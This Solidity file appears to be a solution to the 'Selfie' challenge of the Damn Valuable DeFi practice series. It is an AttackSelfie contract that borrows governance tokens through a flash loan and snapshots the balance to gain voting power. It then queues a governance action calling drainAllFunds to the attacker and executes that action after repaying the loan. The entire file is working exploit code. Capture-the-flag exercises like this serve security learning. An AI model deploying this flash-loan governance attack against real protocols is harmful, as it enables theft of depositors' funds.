// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {

    SelfiePool private pool;
    SimpleGovernance private governance;

    DamnValuableTokenSnapshot private token;

    bytes private data;
    uint256 private actionId;
    
    constructor(address poolAddress) {
        pool = SelfiePool(poolAddress);
        governance = pool.governance();
        token = governance.governanceToken();
    }

    function setup(uint256 tokensToBorrow) external {
        data = abi.encodeWithSignature("drainAllFunds(address)", msg.sender);
        pool.flashLoan(tokensToBorrow);
    }

    function attack() external {
        governance.executeAction(actionId);
    }

    function receiveTokens(address, uint256 amount) external {
        token.snapshot();
        actionId = governance.queueAction(address(pool), data, 0);
        token.transfer(msg.sender, amount);
    }
}
